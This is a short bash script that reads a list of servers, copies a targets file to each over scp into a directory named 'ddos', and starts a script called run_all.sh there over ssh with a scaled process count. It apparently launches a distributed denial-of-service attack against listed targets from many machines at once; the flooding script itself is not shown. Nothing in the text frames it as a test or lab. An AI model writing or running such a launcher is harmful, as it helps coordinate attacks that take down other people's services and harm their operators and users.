#!/usr/bin/env bash

process_k=${4:-1}

while IFS= read -r line; do
    echo "Server: $line";
    server_ip=`echo $line | awk -F ";" '{print $1}'`
    server_processes=`echo $line | awk -F ";" '{print $2}'`

    scp "${2}" andrew@$server_ip:/home/andrew/ddos/targets.txt
ssh -T andrew@$server_ip <<_EOF_
  cd /home/andrew/ddos
  ./run_all.sh targets.txt $(($server_processes * $process_k)) "${3}"
_EOF_
    echo "Done"
    echo ""
done < "${1}"


